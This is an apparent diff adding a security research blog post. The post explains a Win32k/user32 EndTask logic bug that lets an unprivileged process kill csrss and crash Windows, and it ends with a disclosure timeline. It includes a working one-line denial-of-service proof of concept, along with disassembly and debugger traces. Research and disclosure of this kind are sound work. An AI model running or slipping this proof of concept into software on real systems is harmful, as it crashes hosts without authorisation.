@@ -1,0 +1,363 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+
+
+  <title>An unexpected logic bug on Win32k</title>
+
+  
+
+  <meta name="HandheldFriendly" content="True" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="referrer" content="origin" />
+  <meta name="generator" content="Pelican" />
+<link href="https://blahcat.github.io/posts/2020/03/09/an-unexpected-logic-bug-on-win32k.html" rel="canonical" />
+  <!-- Feed -->
+        <link href="https://blahcat.github.io/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="BlahCats Full Atom Feed" />
+          <link href="https://blahcat.github.io/feeds/{slug}.atom.xml" type="application/atom+xml" rel="alternate" title="BlahCats Categories Atom Feed" />
+
+  <link href="https://blahcat.github.io/theme/css/style.css" type="text/css" rel="stylesheet" />
+
+  <!-- Code highlight color scheme -->
+      <link href="https://blahcat.github.io/theme/css/code_blocks/github.css" rel="stylesheet">
+
+    <!-- CSS specified by the user -->
+
+
+    <link href="https://fonts.googleapis.com/css?family=Roboto" type="text/css" rel="stylesheet" />
+
+
+    <link href="https://blahcat.github.io/assets/css/overrides.css" type="text/css" rel="stylesheet" />
+
+
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" type="text/css" rel="stylesheet" />
+
+  <!-- Custom fonts -->
+  <link href='https://fonts.googleapis.com/css?family=Montserrat:400,300' rel='stylesheet' type='text/css' />
+  <link href="https://fonts.googleapis.com/css?family=Lato" rel="stylesheet" type="text/css" />
+
+
+  <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+  <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+  <!--[if lt IE 9]>
+    <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+    <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+  <![endif]-->
+
+
+
+    <meta name="description" content="The short version The short version is that there's a small logic bug in user32!EndTask() which doesn't really check the HWND handle...">
+
+    <meta name="author" content="hugsy">
+
+    <meta name="tags" content="windows">
+    <meta name="tags" content="kernel">
+    <meta name="tags" content="logic">
+    <meta name="tags" content="bug">
+    <meta name="tags" content="win32k">
+
+
+
+
+<!-- Open Graph -->
+<meta prefix="og: http://ogp.me/ns#" property="og:site_name" content="BlahCats"/>
+<meta prefix="og: http://ogp.me/ns#" property="og:title" content="An unexpected logic bug on Win32k"/>
+<meta prefix="og: http://ogp.me/ns#" property="og:description" content="The short version The short version is that there's a small logic bug in user32!EndTask() which doesn't really check the HWND handle..."/>
+<meta prefix="og: http://ogp.me/ns#" property="og:locale" content="en_US"/>
+<meta prefix="og: http://ogp.me/ns#" property="og:url" content="https://blahcat.github.io/posts/2020/03/09/an-unexpected-logic-bug-on-win32k.html"/>
+<meta prefix="og: http://ogp.me/ns#" property="og:type" content="article"/>
+<meta prefix="og: http://ogp.me/ns#" property="article:published_time" content="2020-03-09 00:00:00-07:00"/>
+<meta prefix="og: http://ogp.me/ns#" property="article:modified_time" content="2020-03-09 00:00:00-07:00"/>
+<meta prefix="og: http://ogp.me/ns#" property="article:author" content="https://blahcat.github.io/author/hugsy">
+<meta prefix="og: http://ogp.me/ns#" property="article:section" content="research"/>
+<meta prefix="og: http://ogp.me/ns#" property="article:tag" content="windows"/>
+<meta prefix="og: http://ogp.me/ns#" property="article:tag" content="kernel"/>
+<meta prefix="og: http://ogp.me/ns#" property="article:tag" content="logic"/>
+<meta prefix="og: http://ogp.me/ns#" property="article:tag" content="bug"/>
+<meta prefix="og: http://ogp.me/ns#" property="article:tag" content="win32k"/>
+<meta prefix="og: http://ogp.me/ns#" property="og:image" content="https://blahcat.github.io/assets/images/CDA9D98DF912DE08CB61AD0A3A148723A37BC3F3.png">
+
+<!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:site" content="@ctf_blahcat">
+    <meta name="twitter:title" content="An unexpected logic bug on Win32k">
+    <meta name="twitter:url" content="https://blahcat.github.io/posts/2020/03/09/an-unexpected-logic-bug-on-win32k.html">
+
+        <meta name="twitter:image:src" content="https://blahcat.github.io/assets/images/CDA9D98DF912DE08CB61AD0A3A148723A37BC3F3.png">
+
+      <meta name="twitter:description" content="The short version The short version is that there's a small logic bug in user32!EndTask() which doesn't really check the HWND handle...">
+
+<script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Article",
+  "name": "An unexpected logic bug on Win32k",
+  "headline": "An unexpected logic bug on Win32k",
+  "datePublished": "2020-03-09 00:00:00-07:00",
+  "dateModified": "2020-03-09 00:00:00-07:00",
+  "author": {
+    "@type": "Person",
+    "name": "hugsy",
+    "url": "https://blahcat.github.io/author/hugsy"
+  },
+  "image": "https://blahcat.github.io/assets/images/CDA9D98DF912DE08CB61AD0A3A148723A37BC3F3.png",
+  "url": "https://blahcat.github.io/posts/2020/03/09/an-unexpected-logic-bug-on-win32k.html",
+  "description": "The short version The short version is that there's a small logic bug in user32!EndTask() which doesn't really check the HWND handle..."
+}
+</script>
+</head>
+<!-- TODO : Body class -->
+<body class="home-template">
+
+<nav id="menu">
+  <a class="close-button">Close</a>
+  <div class="nav-wrapper">
+    <p class="nav-label">Menu</p>
+    <ul>
+          <li><a href="/pages/about.html" role="presentation">About</a></li>
+          <li><a href="/categories/" role="presentation">Browse By Category</a></li>
+          <li><a href="/tags/" role="presentation">Browse By Tag</a></li>
+          <li><a href="/pages/qemu-vm-repo" role="presentation">Qemu VMs</a></li>
+          <li><a href="/pages/exploitation-series" role="presentation">Exploitation Tutorials</a></li>
+          <li><a href="/pages/notes" role="presentation">Misc Notes</a></li>
+          <li><a href="/feeds/all.atom.xml" role="presentation">RSS Feed</a></li>
+
+
+    </ul>
+  </div>
+</nav>
+    <!-- Progressbar -->
+    <div class="progress-container">
+        <span class="progress-bar"></span>
+    </div>
+
+    <!-- Page Header -->
+    <!-- Set your background image for this header on the line below. -->
+    <header id="post-header" class="has-cover">
+      <div class="inner">
+        <nav id="navigation">
+            <span id="home-button" class="nav-button">
+                <a class="home-button" href="https://blahcat.github.io/" title="Home"><i class="ic ic-arrow-left"></i> Home</a>
+            </span>
+          <span id="menu-button" class="nav-button">
+            <a class="menu-button"><i class="ic ic-menu"></i> Menu</a>
+          </span>
+        </nav>
+        <h1 class="post-title">An unexpected logic bug on Win32k</h1>
+        <!-- TODO : Proper class for headline -->
+        <span class="post-meta">
+                <a href="https://blahcat.github.io/author/hugsy">hugsy</a>
+            <br>
+              Posted on <time style="font-weight: bold">09 Mar 2020</time>
+          </span>
+
+            <div class="post-cover cover" style="background-image: url('https://blahcat.github.io/assets/images/CDA9D98DF912DE08CB61AD0A3A148723A37BC3F3.png')">
+      </div>
+    </header>
+
+  <section id="wrapper">
+    <a class="hidden-close"></a>
+
+    <!-- Post content -->
+    <main class="content" role="main">
+        <article class="post">
+        <div class="inner">
+            <section class="post-content">
+                <h2>The short version</h2>
+<p>The short version is that there's a small logic bug in  <code>user32!EndTask()</code> which doesn't really check the <code>HWND</code> handle passed when forcefully killing the process, allowing unprivileged process to BSoD the host by killing the critical process <code>csrss</code>. And as a bonus the PoC code #FitsInATweet:</p>
+<div class="highlight"><pre><span></span><code><span class="kt">int</span><span class="w"> </span><span class="nf">WinMain</span><span class="p">(</span><span class="n">HINSTANCE</span><span class="w"> </span><span class="n">h</span><span class="p">,</span><span class="w"> </span><span class="n">HINSTANCE</span><span class="w"> </span><span class="n">ins</span><span class="p">,</span><span class="w"> </span><span class="n">LPSTR</span><span class="w"> </span><span class="n">cmd</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">nb</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="w">    </span><span class="n">EndTask</span><span class="p">(</span><span class="n">GetDesktopWindow</span><span class="p">(),</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>Just compile, run (here on a build 19569.1000 x64) and enjoy:</p>
+<p><img alt="bsod" src="https://i.imgur.com/DRxULeh.png"></p>
+<h2>The less short version</h2>
+<p>Reversing <code>Win32k.sys</code> driver has been my hobby lately mostly to understand it (finally) seriously - if there is such a thing. This is a really small funny logic bug I encountered while reversing it, which I don't feel too bad disclosing since there is <a href="https://www.microsoft.com/en-us/msrc/windows-security-servicing-criteria" target="_blank">no security exploitability</a> (simply annoying your sysadmin).</p>
+<h3>The juicy part</h3>
+<p>The legacy function <a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-endtask" target="_blank">EndTask</a> can be used to forcefully close the specific window whose handle is passed as argument, and free all associated resources. Although deprecated according to the MSDN, it is still callable even on the latest Windows versions.</p>
+<p>The function <code>user32!EndTask()</code> is merely a wrapper designed to forward some specific messages to the <a href="https://en.wikipedia.org/wiki/Client/Server_Runtime_Subsystem" target="_blank">CSRSS</a> via an ALPC, using the exported function
+<code>ntdll!CsrClientCallServer</code> with the ApiNumber 0x30401. Easily enough, the function takes the handle to the window to shut down. The function operates with the thread's token, and is unprivileged. Starting playing around, I remembered that <code>GetDesktopWindow()</code> will return a valid handle to the desktop window, but has <a href="https://devblogs.microsoft.com/oldnewthing/20040224-00/?p=40493" target="_blank">many interesting properties</a> including that that it is owned by <code>csrss.exe</code>. That can be quickly demonstrated using the following code:</p>
+<div class="highlight"><pre><span></span><code><span class="kt">int</span><span class="w"> </span><span class="n">WINAPI</span><span class="w"> </span><span class="nf">WinMain</span><span class="p">(</span><span class="n">HINSTANCE</span><span class="w"> </span><span class="n">hInstance</span><span class="p">,</span><span class="w"> </span><span class="n">HINSTANCE</span><span class="w"> </span><span class="n">hPrevInstance</span><span class="p">,</span><span class="w"> </span><span class="n">LPSTR</span><span class="w"> </span><span class="n">lpCmdLine</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">nCmdShow</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">msg</span><span class="p">[</span><span class="mi">1024</span><span class="p">]</span><span class="o">=</span><span class="p">{</span><span class="mi">0</span><span class="p">,};</span>
+<span class="w">    </span><span class="n">HWND</span><span class="w"> </span><span class="n">hwnd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">GetDesktopWindow</span><span class="p">();</span>
+<span class="w">    </span><span class="n">DWORD</span><span class="w"> </span><span class="n">dwProcessId</span><span class="p">;</span>
+<span class="w">    </span><span class="n">GetWindowThreadProcessId</span><span class="p">(</span><span class="n">hwnd</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">dwProcessId</span><span class="p">);</span>
+<span class="w">    </span><span class="n">sprintf</span><span class="p">(</span><span class="n">msg</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;hwnd=%p pid=%lu</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">hwnd</span><span class="p">,</span><span class="w"> </span><span class="n">dwProcessId</span><span class="p">);</span>
+<span class="w">    </span><span class="n">MessageBoxA</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">msg</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">MB_OK</span><span class="p">);</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>which will output the PID of CSRSS</p>
+<p><img alt="finding_csrss" src="https://i.imgur.com/Q4XsJZP.png"></p>
+<p>In turn, CSRSS will consume that message and call <code>winsrvext!SrvEndTask()</code> then <code>winsrvext!EndTask()</code>. In this function, in order to determine the process to terminate <code>csrss</code> will invoke <code>GetWindowThreadProcessId()</code> and will use the found process id value to look into the <a href="http://www.geoffchappell.com/studies/windows/win32/csrsrv/api/process/process.htm" target="_blank"><code>CSR_PROCESS</code></a> linked
+list (via <code>csrsrv!CsrRootProcess</code>), and find the <code>CSR_PROCESS</code> structure associated to such PID. From <code>winsrvext.dll</code>:</p>
+<div class="highlight"><pre><span></span><code><span class="nf">_EndTask</span><span class="w">      </span><span class="c1">; NTSTATUS __fastcall EndTask(HWND hWnd, int a2)</span>
+<span class="nf">_EndTask</span><span class="w">      </span><span class="no">_EndTask</span><span class="w">        </span><span class="no">proc</span><span class="w"> </span><span class="no">near</span><span class="w">               </span><span class="c1">; CODE XREF: SrvEndTask+119↓p</span>
+<span class="nf">_EndTask</span><span class="w">                                              </span><span class="c1">; DATA XREF: .pdata:000000000001D21C↓o</span>
+<span class="err">[</span><span class="na">...</span><span class="p">]</span>
+<span class="nf">_EndTask</span><span class="err">+</span><span class="no">A7</span><span class="w">                   </span><span class="no">lea</span><span class="w">     </span><span class="no">rdx</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">120</span><span class="no">h</span><span class="err">+</span><span class="no">dwProcessId</span><span class="p">]</span><span class="w"> </span><span class="c1">; lpdwProcessId</span>
+<span class="nf">_EndTask</span><span class="err">+</span><span class="no">AC</span><span class="w">                   </span><span class="no">mov</span><span class="w">     </span><span class="no">rcx</span><span class="p">,</span><span class="w"> </span><span class="no">rdi</span><span class="w">        </span><span class="c1">; hWnd</span>
+<span class="nf">_EndTask</span><span class="err">+</span><span class="no">AF</span><span class="w">                   </span><span class="no">call</span><span class="w">    </span><span class="no">cs</span><span class="p">:</span><span class="no">__imp_GetWindowThreadProcessId</span>
+</code></pre></div>
+
+<h3>The bug</h3>
+<p>And therein lied the bug: as shown above with the small C snippet, the owner of <code>GetDesktopWindow()</code> is <code>csrss</code> itself, therefore the lookup will return the <code>CSR_PROCESS</code> structure of <code>CSRSS</code> (which happens to be the first entry in the <code>CsrRootProcess</code> linked list). Finally, <code>winsrvext!EndTask()</code> will proceed to call <code>ntdll!NtTerminateProcess()</code> passing the handle to the
+process <code>CSRSS</code>, which has the value <code>(HANDLE)-1</code> (i.e. <code>GetCurrentProcess()</code>). WinDbg can be used to confirm that behavior:</p>
+<div class="highlight"><pre><span></span><code><span class="mi">0</span><span class="o">:</span><span class="w"> </span><span class="n">kd</span><span class="o">&gt;</span><span class="w"> </span><span class="n">dps</span><span class="w"> </span><span class="n">poi</span><span class="o">(</span><span class="w"> </span><span class="n">csrsrv</span><span class="o">!</span><span class="n">CsrRootProcess</span><span class="w"> </span><span class="o">)</span>
+<span class="mi">00000218</span><span class="err">`</span><span class="mi">7</span><span class="n">d004550</span><span class="w">  </span><span class="mi">00000000</span><span class="err">`</span><span class="mi">00000</span><span class="n">c14</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="n">CSR_PROCESS</span><span class="o">.</span><span class="na">ClientId</span>
+<span class="mi">00000218</span><span class="err">`</span><span class="mi">7</span><span class="n">d004558</span><span class="w">  </span><span class="mi">00000000</span><span class="err">`</span><span class="mi">00000</span><span class="n">c18</span>
+<span class="mi">00000218</span><span class="err">`</span><span class="mi">7</span><span class="n">d004560</span><span class="w">  </span><span class="mi">00000218</span><span class="err">`</span><span class="mi">7</span><span class="n">d008bf0</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="n">CSR_PROCESS</span><span class="o">.</span><span class="na">LinkList</span>
+<span class="mi">00000218</span><span class="err">`</span><span class="mi">7</span><span class="n">d004568</span><span class="w">  </span><span class="mi">00000218</span><span class="err">`</span><span class="mi">7</span><span class="n">d04b3a0</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="n">CSR_PROCESS</span><span class="o">.</span><span class="na">ThreadList</span>
+<span class="mi">00000218</span><span class="err">`</span><span class="mi">7</span><span class="n">d004570</span><span class="w">  </span><span class="mi">00000218</span><span class="err">`</span><span class="mi">7</span><span class="n">d005368</span><span class="w"> </span><span class="o">[...]</span>
+<span class="mi">00000218</span><span class="err">`</span><span class="mi">7</span><span class="n">d004578</span><span class="w">  </span><span class="mi">00000218</span><span class="err">`</span><span class="mi">7</span><span class="n">d0486b8</span>
+<span class="mi">00000218</span><span class="err">`</span><span class="mi">7</span><span class="n">d004580</span><span class="w">  </span><span class="mi">00000000</span><span class="err">`</span><span class="mi">00000000</span>
+<span class="mi">00000218</span><span class="err">`</span><span class="mi">7</span><span class="n">d004588</span><span class="w">  </span><span class="mi">00000000</span><span class="err">`</span><span class="mi">00000000</span>
+<span class="mi">00000218</span><span class="err">`</span><span class="mi">7</span><span class="n">d004590</span><span class="w">  </span><span class="mi">00000000</span><span class="err">`</span><span class="mi">00000000</span>
+<span class="mi">00000218</span><span class="err">`</span><span class="mi">7</span><span class="n">d004598</span><span class="w">  </span><span class="mi">00000000</span><span class="err">`</span><span class="mi">00000000</span>
+<span class="mi">00000218</span><span class="err">`</span><span class="mi">7</span><span class="n">d0045a0</span><span class="w">  </span><span class="n">ffffffff</span><span class="err">`</span><span class="n">ffffffff</span><span class="w"> </span><span class="o">&lt;&lt;-</span><span class="w"> </span><span class="n">CSR_PROCESS</span><span class="o">.</span><span class="na">ProcessHandle</span><span class="w"> </span><span class="o">(</span><span class="n">i</span><span class="o">.</span><span class="na">e</span><span class="o">.</span><span class="w"> </span><span class="n">value</span><span class="w"> </span><span class="n">passed</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">NtTerminateProcess</span><span class="o">)</span>
+<span class="mi">00000218</span><span class="err">`</span><span class="mi">7</span><span class="n">d0045a8</span><span class="w">  </span><span class="mi">00000040</span><span class="err">`</span><span class="mi">00000005</span>
+<span class="o">[...]</span>
+</code></pre></div>
+
+<p>Therefore, this will make <code>CSRSS</code> killing itself when invoking calling the syscall <code>nt!NtTerminateProcess(GetCurrentProcess(), 0 )</code>. As a critical process, killing CSRSS will immediately result in a BSoD, which BugCheck clearly shows. Also note that this crash can be triggered by any user even with any privilege. In WinDbg the faulting stack trace of our BSoD retraces exactly everything we show:</p>
+<div class="highlight"><pre><span></span><code>CRITICAL_PROCESS_DIED (ef)
+        A critical system process died
+[...]
+Arguments:
+Arg1: ffffe30f47ce14c0, Process object or thread object
+Arg2: 0000000000000000, If this is 0, a process died. If this is 1, a thread died.
+[...]
+
+STACK_TEXT:
+ffff8803`2a71f280 fffff801`795c75c1 : [...] : nt!PspCatchCriticalBreak+0xa9
+ffff8803`2a71f320 fffff801`79439fc0 : [...] : nt!PspTerminateAllThreads+0x175e3d
+ffff8803`2a71f390 fffff801`79439da9 : [...] : nt!PspTerminateProcess+0xe0
+ffff8803`2a71f3d0 fffff801`78fd2d15 : [...] : nt!NtTerminateProcess+0xa9
+ffff8803`2a71f440 00007ff9`83b5c644 : [...] : nt!KiSystemServiceCopyEnd+0x25
+000000b6`d35befd8 00007ff9`809066e5 : [...] : ntdll!NtTerminateProcess+0x14
+000000b6`d35befe0 00007ff9`80906bae : [...] : winsrvext!EndTask+0x235
+000000b6`d35bf110 00007ff9`80975af4 : [...] : winsrvext!SrvEndTask+0x11e
+000000b6`d35bf380 00007ff9`83b2cedf : [...] : CSRSRV!CsrApiRequestThread+0x484
+000000b6`d35bf810 00000000`00000000 : [...] : ntdll!RtlUserThreadStart+0x2f
+</code></pre></div>
+
+<h2>Final words</h2>
+<p>This was a good lesson, mostly because I would never have thought finding a (cheap) logic bug in an API that is around for decades and probably gleaned at many times by people way smarter.</p>
+<p>Also, I've reported more Win32k bugs to MS which I'll be writing up on soon.</p>
+<p>That's all for this quick post!</p>
+<p>✌</p>
+<h2>Disclosure timeline</h2>
+<ul>
+<li>2019-12-09 : Bug found</li>
+<li>2020-02-08 : Finally found some time to do some analysis</li>
+<li>2020-02-09 : Issue submitted to MSRC (case 56511)</li>
+<li>2020-03-04 : EWONTFIX</li>
+</ul>
+            </section>
+
+
+            <section class="post-info">
+                <div class="post-share">
+                    <a class="twitter" href="https://twitter.com/share?text=An unexpected logic bug on Win32k&amp;url=https://blahcat.github.io/posts/2020/03/09/an-unexpected-logic-bug-on-win32k.html" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                    <i class="ic ic-twitter"></i><span class="hidden">Twitter</span>
+                    </a>
+                    <a class="facebook" href="https://www.facebook.com/sharer/sharer.php?u=https://blahcat.github.io/posts/2020/03/09/an-unexpected-logic-bug-on-win32k.html" onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+                    <i class="ic ic-facebook"></i><span class="hidden">Facebook</span>
+                    </a>
+                    <a class="googleplus" href="https://plus.google.com/share?url=https://blahcat.github.io/posts/2020/03/09/an-unexpected-logic-bug-on-win32k.html" onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
+                    <i class="ic ic-googleplus"></i><span class="hidden">Google+</span>
+                    </a>
+                    <div class="clear"></div>
+                </div>
+
+                
+              
+                <aside class="post-tags">
+<a href="https://blahcat.github.io/tag/windows">windows</a><a href="https://blahcat.github.io/tag/kernel">kernel</a><a href="https://blahcat.github.io/tag/logic">logic</a><a href="https://blahcat.github.io/tag/bug">bug</a><a href="https://blahcat.github.io/tag/win32k">win32k</a>                </aside>
+              
+               <a title="Category" style="font-weight: bold;" class="category_link" href="https://blahcat.github.io/category/research">research</a>
+
+                <div class="clear"></div>
+
+                <aside class="post-discussions">
+                    <div id="discussion_thread">
+                      Continue the discussion on
+                      <a href="https://github.com/blahcat/blahcat.github.io/discussions?discussions_q=An unexpected logic bug on Win32k">
+                        <i class="fa fa-github fa-lg"></i>
+                        GitHub
+                      </a>
+                      <div class="clear"></div>
+                    </div>
+                  </aside>
+
+
+                <aside class="post-author">
+
+
+                        <figure class="post-author-avatar">
+                            <img src="https://blahcat.github.io/assets/images/authors/hugsy.png" alt="hugsy" />
+                        </figure>
+                    <div class="post-author-bio">
+                        <h4 class="post-author-name"><a href="https://blahcat.github.io/author/hugsy">hugsy</a></h4>
+                            <p class="post-author-about">BWAAAAHHHH</p>
+                            <span class="post-author-website"><a href="/author/hugsy"><i class="ic ic-link"></i> Website</a></span>
+                        <!-- Social linkes in alphabet order. -->
+                            <span class="post-author-github"><a target="_blank" href="https://github.com/hugsy"><i class="ic ic-link"></i> GitHub</a></span>
+                            <span class="post-author-twitter"><a target="_blank" href="https://twitter.com/_hugsy_"><i class="ic ic-twitter"></i> Twitter</a></span>
+                    </div>
+                    <div class="clear"></div>
+                </aside>
+
+                </section>
+
+                <aside class="post-nav">
+                    <a class="post-nav-next" href="https://blahcat.github.io/posts/2020/05/23/enumerating-processes-from-kd.html">
+                        <section class="post-nav-teaser">
+                            <i class="ic ic-arrow-left"></i>
+                                <h2 class="post-nav-title">Enumerating processes from KD</h2>
+                            <p class="post-nav-excerpt">This is tiny Post-It post to remind of different ways to enumerate processes from KD:...</p>
+                        </section>
+                    </a>
+                    <a class="post-nav-prev" href="https://blahcat.github.io/posts/2019/03/17/small-dumps-in-the-big-pool.html">
+                        <section class="post-nav-teaser">
+                            <i class="ic ic-arrow-right"></i>
+                                <h2 class="post-nav-title">Small dumps in the big pool</h2>
+                            <p class="post-nav-excerpt">Or, on how to use the (Windows 10) new field _ETHREAD.ThreadName to stabilize kernel...</p>
+                        </section>
+                    </a>
+                    <div class="clear"></div>
+                </aside>
+
+            </div>
+        </article>
+    </main>
+      <!-- TODO : Body class -->
+    <div id="body-class" style="display: none;" class=""></div>
+
+    <footer id="footer">
+      <div class="inner">
+        <section class="credits">
+          <span class="credits-theme"><a class="fa fa-twitter fa-3x" href="https://twitter.com/ctf_blahcat" target="_blank"></a>&nbsp;&nbsp;<a class="fa fa-github fa-3x" href="https://github.com/blahcat" target="_blank"></a>&nbsp;&nbsp;<a class="fa fa-youtube fa-3x" href="https://www.youtube.com/channel/UCDrgY65mRZWVoMiB5-VMqfg" target="_blank"></a></span>
+          <span class="credits-software">Powered by <a href="https://github.com/getpelican/pelican" rel="nofollow">Pelican</a> and <a href="https://github.com/arulrajnet/attila" rel="nofollow">Attila</a> theme</span>
+        </section>
+      </div>
+    </footer>
+  </section>
+
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.4/jquery.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/highlight.min.js"></script>
+  <script type="text/javascript" src="https://blahcat.github.io/theme/js/script.js"></script>
+
+    <!-- Script specified by the user -->
+    <script type="text/javascript"  src="https://cdnjs.cloudflare.com/ajax/libs/mermaid/9.1.1/mermaid.min.js"></script>
+</body>
+</html>
